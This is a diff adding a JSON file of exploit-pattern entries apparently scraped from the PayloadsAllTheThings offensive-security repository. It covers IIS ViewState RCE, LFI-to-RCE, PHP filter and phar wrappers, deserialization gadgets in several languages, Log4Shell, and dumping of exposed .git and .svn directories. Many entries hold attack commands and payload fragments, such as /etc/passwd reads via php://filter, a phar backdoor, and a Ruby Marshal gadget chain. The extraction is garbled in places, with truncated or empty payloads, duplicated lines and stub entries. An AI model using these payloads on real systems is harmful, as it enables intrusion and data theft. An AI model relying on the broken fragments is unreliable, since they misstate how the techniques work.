@@ -1,0 +1,1452 @@
+[
+  {
+    "id": "api-1",
+    "type": "ExploitPattern",
+    "category": "API",
+    "title": "IIS Machine Keys",
+    "description": "> That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification. * [Viewstate Format](#viewstate-format) * [Machine Key Format And Locations](#machine-key-format-and-locations) * [Identify Known Machine Key](#identify-known-machine-key) * [Decode ViewState](#decode-viewstate) * [Generate ViewState For RCE](#generate-viewstate-for-rce) * [MAC Is Not Enabled](#mac-is-not-enabled) * [MAC Is Enabled And Encryption Is Disabled](#mac-is-enabled-and-encryption-is-disabled)",
+    "techniques": [
+      "`C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\config\\machine.config`",
+      "`C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\config\\machine.config`",
+      "`C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config`",
+      "`C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\config\\machine.config`",
+      "in the registry when **AutoGenerate** is enabled (extract with [irsdl/machineKeyFinder.aspx](https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab))",
+      "`HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4`",
+      "`HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey`",
+      "`__VIEWSTATE`",
+      "`__VIEWSTATEGENERATOR`",
+      "Find the machine key (validationkey) using `badsecrets`, `viewstalker`, `AspDotNetWrapper.exe` or `viewgen`",
+      "Then generate a ViewState using [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net), both `TextFormattingRunProperties` and `TypeConfuseDelegate` gadgets can be used.",
+      ".NET Framework  4.5, the machineKey has the property: `compatibilityMode=\"Framework45\"`",
+      "The `validationKey` attribute specifies a hexadecimal string used to validate data, ensuring it hasn't been tampered with.",
+      "The `decryptionKey` attribute provides a hexadecimal string used to encrypt and decrypt sensitive data.",
+      "The `validation` attribute defines the algorithm used for data validation, with options like SHA1, MD5, 3DES, AES, and HMACSHA256, among others.",
+      "The `decryption` attribute specifies the encryption algorithm, with options like Auto, DES, 3DES, and AES, or you can specify a custom algorithm using alg:algorithm_name.",
+      "The following example of a machineKey is from [Microsoft documentation](https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication).",
+      "Common locations of **web.config** / **machine.config**",
+      "* 32-bits",
+      "* `C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\config\\machine.config`"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "api"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "auth-2",
+    "type": "ExploitPattern",
+    "category": "AUTH",
+    "title": "MFA Bypasses",
+    "description": "> Multi-Factor Authentication (MFA) is a security measure that requires users to provide two or more verification factors to gain access to a system, application, or network. It combines something the user knows (like a password), something they have (like a phone or security token), and/or something they are (biometric verification). This layered approach enhances security by making unauthorized access more difficult, even if a password is compromised. > MFA Bypasses are techniques attackers use to circumvent MFA protections. These methods can include exploiting weaknesses in MFA implementations, intercepting authentication tokens, leveraging social engineering to manipulate users or support staff, or exploiting session-based vulnerabilities.",
+    "techniques": [
+      "\"otp\":[",
+      "\"1234\",",
+      "\"1111\",",
+      "\"1337\", // GOOD OTP",
+      "\"2222\",",
+      "\"3333\",",
+      "\"4444\",",
+      "\"5555\""
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "auth"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-3",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "CONTRIBUTING",
+    "description": "PayloadsAllTheThings' Team :heart: pull requests. Feel free to improve with your payloads and techniques ! You can also contribute with a :beers: IRL, or using the [sponsor](https://github.com/sponsors/swisskyrepo) button. In order to provide the safest payloads for the community, the following rules must be followed for **every** Pull Request. - Use `id`, and `whoami`, for RCE Proof of Concepts - Use `[ATTACKER.DOMAIN.TLD]` when the user has to replace a domain for a callback. E.g: XSSHunter, BurpCollaborator etc.",
+    "techniques": [
+      "Payloads must be sanitized",
+      "Use `id`, and `whoami`, for RCE Proof of Concepts",
+      "Use `[ATTACKER.DOMAIN.TLD]` when the user has to replace a domain for a callback. E.g: XSSHunter, BurpCollaborator etc.",
+      "Use `10.10.10.10` and `10.10.10.11` when the payload require IP addresses",
+      "Use `Administrator` for privileged users and `User` for normal account",
+      "Use `P@ssw0rd`, `Password123`, `password` as default passwords for your examples",
+      "Prefer commonly used name for machines such as `DC01`, `EXCHANGE01`, `WORKSTATION01`, etc",
+      "References must have an `author`, a `title`, a `link` and a `date`",
+      "Use [Wayback Machine](https://web.archive.org/) if the reference is not available anymore.",
+      "The date must be following the format `Month Number, Year`, e.g: `December 25, 2024`",
+      "References to Github repositories must follow this format: `[author/tool](https://github.com/URL) - Description`",
+      "README.md: vulnerability description and how to exploit it, including several payloads, more below",
+      "Intruder: a set of files to give to Burp Intruder",
+      "Images: pictures for the README.md",
+      "Files: some files referenced in the README.md",
+      "Tools: Lists relevant tools with links to their repositories and brief descriptions.",
+      "Methodology: Provides a quick overview of the approach used, with code snippets to demonstrate exploitation steps.",
+      "Labs: References online platforms where similar vulnerabilities can be practiced, each with a link to the corresponding lab.",
+      "References: Lists external resources, such as blog posts or articles, providing additional context or case studies related to the vulnerability."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-4",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "CVE-2021-44228 Log4Shell",
+    "description": "> Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled * [Vulnerable code](#vulnerable-code) * [Exploitation](#exploitation) * [Environment variables exfiltration](#environment-variables-exfiltration) * [Remote Command Execution](#remote-command-execution)",
+    "techniques": [
+      "* [fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan) - Log4Shell scanning utility",
+      "* [Nuclei Template](https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/cves/2021/CVE-2021-44228.yaml)",
+      "* [artsploit/rogue-jndi](https://github.com/artsploit/rogue-jndi) - Rogue JNDI LDAP/RMI exploitation server"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-5",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "DISCLAIMER",
+    "description": "The authors and contributors of this repository disclaim any and all responsibility for the misuse of the information, tools, or techniques described herein. The content is provided solely for educational and research purposes. Users are strictly advised to utilize this information in accordance with applicable laws and regulations and only on systems for which they have explicit authorization. By accessing and using this repository, you agree to: * Refrain from using the provided information for any unethical or illegal activities.",
+    "techniques": [
+      "Refrain from using the provided information for any unethical or illegal activities.",
+      "Ensure that all testing and experimentation are conducted responsibly and with proper authorization.",
+      "Acknowledge that any actions you take based on the contents of this repository are solely your responsibility."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "lfi-6",
+    "type": "ExploitPattern",
+    "category": "LFI",
+    "title": "LFI to RCE",
+    "description": "> LFI (Local File Inclusion) is a vulnerability that occurs when a web application includes files from the local file system, often due to insecure handling of user input. If an attacker can control the file path, they can potentially include sensitive or dangerous files such as system files (/etc/passwd), configuration files, or even malicious files that could lead to Remote Code Execution (RCE). - [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd) - [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)",
+    "techniques": [
+      "PHP 7.0.0 (2015) to 8.3.7 (2024)",
+      "GNU C Library (`glibc`) ` ).",
+      "Upload a file and trigger a self-inclusion.",
+      "Repeat the upload a shitload of time to:",
+      "increase our odds of winning the race",
+      "increase our guessing odds",
+      "Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}",
+      "Enjoy our shell.",
+      "`*`/`` : Represents any single character.",
+      "Method 1: config create",
+      "Method 2: man_dir",
+      "Method 3: download (need external network connection).",
+      "Method 4: install (need external network connection). Notice that `exec.php` locates at `/tmp/pear/download/exec.php`.",
+      "Like a log file, send the payload in the `User-Agent` header, it will be reflected inside the `/proc/self/environ` file",
+      "**Requirements**:",
+      "- PHP 7.0.0 (2015) to 8.3.7 (2024)",
+      "- GNU C Library (`glibc`) ` ).",
+      "In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf",
+      "- Upload a file and trigger a self-inclusion.",
+      "- Repeat the upload a shitload of time to:"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "lfi"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "lfi-7",
+    "type": "ExploitPattern",
+    "category": "LFI",
+    "title": "Inclusion Using Wrappers",
+    "description": "A wrapper in the context of file inclusion vulnerabilities refers to the protocol or method used to access or include a file. Wrappers are often used in PHP or other server-side languages to extend how file inclusion functions, enabling the use of protocols like HTTP, FTP, and others in addition to the local filesystem. - [Wrapper php://filter](#wrapper-phpfilter) - [Wrapper data://](#wrapper-data) - [Wrapper expect://](#wrapper-expect) - [Wrapper input://](#wrapper-input) - [Wrapper zip://](#wrapper-zip)",
+    "techniques": [
+      "Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`",
+      "deflate then `base64encode` (useful for limited character exfil): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`",
+      "Create an evil payload: `echo \"\" > payload.php;`",
+      "Zip the file",
+      "Upload the archive and access the file using the wrappers:",
+      "Create a phar archive containing a backdoor file: `php --define phar.readonly=0 archive.php`",
+      "Use the `phar://` wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt`",
+      "`convert.iconv://`: convert input into another folder (`convert.iconv.utf-16le.utf-8`)",
+      "`dechunk://`: if the string contains no newlines, it will wipe the entire string if and only if the string starts with A-Fa-f0-9",
+      "Backend must not use `file_exists` or `is_file`.",
+      "Vulnerable parameter should be in a `POST` request.",
+      "You can't leak more than 135 characters in a GET request due to the size limit",
+      "http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php",
+      "http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
+      "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php",
+      "http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
+      "./kadimus -u \"http://example.com/index.php?page=vuln\" -S -f \"index.php%00\" -O index.php --parameter page",
+      "curl \"http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\" | base64 -d > index.php",
+      "$ python3 php_filter_chain_generator.py --chain ''",
+      "[+] The following gadget chain will generate the following code :  (base64 value: PD9waHAgcGhwaW5mbygpOz8+)"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "lfi"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "deserialization-8",
+    "type": "ExploitPattern",
+    "category": "DESERIALIZATION",
+    "title": ".NET Deserialization",
+    "description": "> .NET serialization is the process of converting an object’s state into a format that can be easily stored or transmitted, such as XML, JSON, or binary. This serialized data can then be saved to a file, sent over a network, or stored in a database. Later, it can be deserialized to reconstruct the original object with its data intact. Serialization is widely used in .NET for tasks like caching, data transfer between applications, and session state management. * [XmlSerializer](#xmlserializer) * [DataContractSerializer](#datacontractserializer)",
+    "techniques": [
+      "In C# source code, look for `XmlSerializer(typeof());`.",
+      "The attacker must control the **type** of the XmlSerializer.",
+      "Payload output: **XML**",
+      "In C# source code, look for `DataContractSerializer(typeof())`.",
+      "Data **Type** must be user-controlled to be exploitable",
+      "In C# source code, look for `NetDataContractSerializer().ReadObject()`.",
+      "Use `BinaryFormatter` internally.",
+      "In C# source code, look for `JsonConvert.DeserializeObject(json, new JsonSerializerSettings`.",
+      "Payload output: **JSON**",
+      "In C# source code, look for `System.Runtime.Serialization.Binary.BinaryFormatter`.",
+      "Exploitation requires `[Serializable]` or `ISerializable` interface.",
+      "Payload output: **Binary**",
+      "Serializable",
+      "Public/settable variables",
+      "Magic \"functions\": Get/Set, OnSerialisation, Constructors/Destructors",
+      "ObjectDataProvider from `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\WPF\\PresentationFramework.dll`",
+      "Use `MethodParameters` to set arbitrary parameters",
+      "Use `MethodName` to call an arbitrary function",
+      "ExpandedWrapper",
+      "Specify the `object types` of the objects that are encapsulated"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "deserialization"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "deserialization-9",
+    "type": "ExploitPattern",
+    "category": "DESERIALIZATION",
+    "title": "Java Deserialization",
+    "description": "> Java serialization is the process of converting a Java object’s state into a byte stream, which can be stored or transmitted and later reconstructed (deserialized) back into the original object. Serialization in Java is primarily done using the `Serializable` interface, which marks a class as serializable, allowing it to be saved to files, sent over a network, or transferred between JVMs. * [Burp extensions using ysoserial](#burp-extensions) * [Alternative Tooling](#alternative-tooling) * [YAML Deserialization](#yaml-deserialization)",
+    "techniques": [
+      "`\"AC ED 00 05\"` in Hex",
+      "`AC ED`: STREAM_MAGIC. Specifies that this is a serialization protocol.",
+      "`00 05`: STREAM_VERSION. The serialization version.",
+      "`\"rO0\"` in Base64",
+      "`Content-Type` = \"application/x-java-serialized-object\"",
+      "`\"H4sIAAAAAAAAAJ\"` in gzip(base64)",
+      "com.fasterxml.jackson.databind",
+      "org.codehaus.jackson.map",
+      "CVE-2017-7525",
+      "CVE-2017-17485",
+      "CVE-2019-12384",
+      "CVE-2020-36180",
+      "CVE-2020-9548",
+      "Oracle Mojarra (JSF reference implementation)",
+      "Apache MyFaces",
+      "Server side storage: `value=\"-XXX:-XXXX\"`",
+      "Client side storage: `base64 + gzip + Java Object`",
+      "Decryption: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> Data",
+      "**List of payloads included in ysoserial:**",
+      "| Payload             | Authors                                | Dependencies |"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "deserialization"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "deserialization-10",
+    "type": "ExploitPattern",
+    "category": "DESERIALIZATION",
+    "title": "Node Deserialization",
+    "description": "> Node.js deserialization refers to the process of reconstructing JavaScript objects from a serialized format, such as JSON, BSON, or other formats that represent structured data. In Node.js applications, serialization and deserialization are commonly used for data storage, caching, and inter-process communication. * [node-serialize](#node-serialize) * In Node source code, look for: > An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the `unserialize()` function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).",
+    "techniques": [
+      "In Node source code, look for:",
+      "`node-serialize`",
+      "`serialize-to-js`",
+      "2. Add bracket `()` to force the execution",
+      "3. Send the payload"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "deserialization"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "deserialization-11",
+    "type": "ExploitPattern",
+    "category": "DESERIALIZATION",
+    "title": "PHP Deserialization",
+    "description": "> PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.",
+    "techniques": [
+      "`__wakeup()` when an object is unserialized.",
+      "`__destruct()` when an object is deleted.",
+      "`__toString()` when an object is converted to a string.",
+      "Basic serialized data",
+      "Command execution",
+      "In PHP source code, look for `unserialize()` function.",
+      "Interesting [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, and `__debugInfo()`:",
+      "`__construct()`: PHP allows developers to declare constructor methods for classes. Classes which have a constructor method call this method on each newly-created object, so it is suitable for any initialization that the object may need before it is used. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)",
+      "`__destruct()`: The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)",
+      "`__call(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)",
+      "`__callStatic(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)",
+      "`__get(string $name)`: `__get()` is utilized for reading data from inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)",
+      "`__set(string $name, mixed $value)`: `__set()` is run when writing data to inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)",
+      "`__isset(string $name)`: `__isset()` is triggered by calling `isset()` or `empty()` on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)",
+      "`__unset(string $name)`: `__unset()` is invoked when `unset()` is used on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)",
+      "`__unserialize(array $data)`: this function will be passed the restored array that was returned from __serialize().  [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)",
+      "`__toString()`: The __toString() method allows a class to decide how it will react when it is treated like a string [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)",
+      "`__invoke()`: The `__invoke()` method is called when a script tries to call an object as a function. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)",
+      "`__set_state(array $properties)`: This static method is called for classes exported by `var_export()`. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)",
+      "`__clone()`: Once the cloning is complete, if a `__clone()` method is defined, then the newly created object's `__clone()` method will be called, to allow any necessary properties that need to be changed. [php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "deserialization"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "deserialization-12",
+    "type": "ExploitPattern",
+    "category": "DESERIALIZATION",
+    "title": "Python Deserialization",
+    "description": "> Python deserialization is the process of reconstructing Python objects from serialized data, commonly done using formats like JSON, pickle, or YAML. The pickle module is a frequently used tool for this in Python, as it can serialize and deserialize complex Python objects, including custom classes. * [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) - Serialized payload for deserialization RCE attack on python driven applications where pickle,PyYAML, ruamel.yaml or jsonpickle module is used for deserialization of serialized data.",
+    "techniques": [
+      "`cPickle.loads`",
+      "`pickle.loads`",
+      "`_pickle.loads`",
+      "`jsonpickle.decode`",
+      "'print(getattr(open(\"flag\\x2etxt\"), \"read\")())'",
+      "!!python/object/new:Warning",
+      "import cPickle",
+      "from base64 import b64encode, b64decode",
+      "class User:",
+      "def __init__(self):",
+      "self.username = \"anonymous\"",
+      "self.password = \"anonymous\"",
+      "self.rank     = \"guest\"",
+      "h = User()",
+      "auth_token = b64encode(cPickle.dumps(h))",
+      "print(\"Your Auth Token : {}\").format(auth_token)",
+      "new_token = raw_input(\"New Auth Token : \")",
+      "token = cPickle.loads(b64decode(new_token))",
+      "print \"Welcome {}\".format(token.username)",
+      "import cPickle, os"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "deserialization"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "deserialization-13",
+    "type": "ExploitPattern",
+    "category": "DESERIALIZATION",
+    "title": "Ruby Deserialization",
+    "description": "> Ruby deserialization is the process of converting serialized data back into Ruby objects, often using formats like YAML, Marshal, or JSON. Ruby's Marshal module, for instance, is commonly used for this, as it can serialize and deserialize complex Ruby objects. * [Marshal Deserialization](#marshal-deserialization) * [YAML Deserialization](#yaml-deserialization) Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5 for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220",
+    "techniques": [
+      "!ruby/object:Gem::Source::SpecificFile",
+      "!ruby/object:Gem::Installer",
+      "!ruby/object:Gem::SpecFetcher",
+      "!ruby/object:Gem::Requirement",
+      "Vulnerable code",
+      "Universal gadget for ruby &2\"",
+      "- !ruby/object:Gem::Source::SpecificFile"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "deserialization"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-14",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Bazaar",
+    "description": "> Bazaar  (also known as bzr ) is a free, distributed version control system (DVCS) that helps you track project history over time and collaborate seamlessly with others. Developed by Canonical, Bazaar emphasizes ease of use, a flexible workflow, and rich features to cater to both individual developers and large teams. * [kost/dvcs-ripper/rip-bzr.pl](https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl) docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u",
+    "techniques": [
+      "docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u",
+      "python3 dumper.py -u \"http://127.0.0.1:5000/\" -o source",
+      "Created a standalone tree (format: 2a)",
+      "[!] Target : http://127.0.0.1:5000/",
+      "[+] Start.",
+      "[+] GET repository/pack-names",
+      "[+] GET README",
+      "[+] GET checkout/dirstate",
+      "[+] GET checkout/views",
+      "[+] GET branch/branch.conf",
+      "[+] GET branch/format",
+      "[+] GET branch/last-revision",
+      "[+] GET branch/tag",
+      "[+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'",
+      "[*] Finish",
+      "bzr revert",
+      "N  application.py",
+      "N  database.py",
+      "N  static/"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-15",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Git",
+    "description": "* [Recovering file contents from .git/logs/HEAD](#recovering-file-contents-from-gitlogshead) * [Recovering file contents from .git/index](#recovering-file-contents-from-gitindex) * [Automatic recovery](#automatic-recovery) * [git-dumper.py](#git-dumperpy) * [Harvesting secrets](#harvesting-secrets) The following examples will create either a copy of the .git or a copy of the current commit. Check for the following files, if they exist you can extract the .git folder. * Check for 403 Forbidden or directory listing to find the `/.git/` directory",
+    "techniques": [
+      "`.git/config`",
+      "`.git/HEAD`",
+      "`.git/logs/HEAD`",
+      "Check for 403 Forbidden or directory listing to find the `/.git/` directory",
+      "Git saves all information in `.git/logs/HEAD` (try lowercase `head` too)",
+      "Access the commit using the hash",
+      "Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39",
+      "Read the data (flag.txt)",
+      "Run gitleaks against a public repository",
+      "Run gitleaks against a local repository already cloned into /tmp/",
+      "Run gitleaks against a specific Github Pull request",
+      "0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root  1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git",
+      "15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael  1489390329 +0000        commit: Initial.",
+      "26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael  1489390330 +0000        commit: Whoops! Remove flag.",
+      "6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael  1489390332 +0000        commit: Prevent directory listing.",
+      "git init test",
+      "cd test/.git",
+      "wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c",
+      "mkdir .git/object/26",
+      "mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-16",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Mercurial",
+    "description": "> Mercurial  (also known as hg  from the chemical symbol for mercury) is a distributed version control system (DVCS) designed for efficiency and scalability. Developed by Matt Mackall and first released in 2005, Mercurial is known for its speed, simplicity, and ability to handle large codebases. * [kost/dvcs-ripper/master/rip-hg.pl](https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-hg.pl) - Rip web accessible (distributed) version control systems: SVN/GIT/HG... docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u",
+    "techniques": [
+      "docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-17",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Subversion",
+    "description": "> Subversion  (often abbreviated as SVN) is a centralized version control system (VCS) that has been widely used in the software development industry. Originally developed by CollabNet Inc. in 2000, Subversion was designed to be an improved version of CVS (Concurrent Versions System) and has since gained significant traction for its robustness and reliability. * [anantshri/svn-extractor](https://github.com/anantshri/svn-extractor) - Simple script to extract all web resources by means of .SVN folder exposed over network.",
+    "techniques": [
+      "remove `$sha1$` prefix",
+      "add `.svn-base` postfix",
+      "use first byte from hash as a subdirectory of the `pristine/` directory (`94` in this case)",
+      "create complete path, which will be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`",
+      "python svn-extractor.py --url \"url with .svn available\"",
+      "curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base",
+      "INSERT INTO \"NODES\" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-19",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Bind Shell",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/cheatsheets/shell-bind](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/) - [Perl](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#perl) - [Python](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#python) - [PHP](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#php) - [Ruby](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#ruby)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-22",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Cobalt Strike",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/command-control/cobalt-strike](https://swisskyrepo.github.io/InternalAllTheThings/command-control/cobalt-strike/) - [Infrastructure](https://swisskyrepo.github.io/InternalAllTheThings/command-control/cobalt-strike/#infrastructure) - [Redirectors](https://swisskyrepo.github.io/InternalAllTheThings/command-control/cobalt-strike/#redirectors) - [Domain fronting](https://swisskyrepo.github.io/InternalAllTheThings/command-control/cobalt-strike/#domain-fronting)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-25",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Application Escape and Breakout",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/cheatsheets/escape-breakout](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/escape-breakout/) - [Gaining a command shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/escape-breakout/#gaining-a-command-shell) - [Sticky Keys](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/escape-breakout/#sticky-keys) - [Dialog Boxes](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/escape-breakout/#dialog-boxes)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-26",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "HTML Smuggling",
+    "description": ":warning: Content of this page has been moved to [InternalAllTheThings/redteam/access/html-smuggling](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/html-smuggling/) - [Description](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/html-smuggling/#description) - [Executable Storage](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/html-smuggling/#executable-storage)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
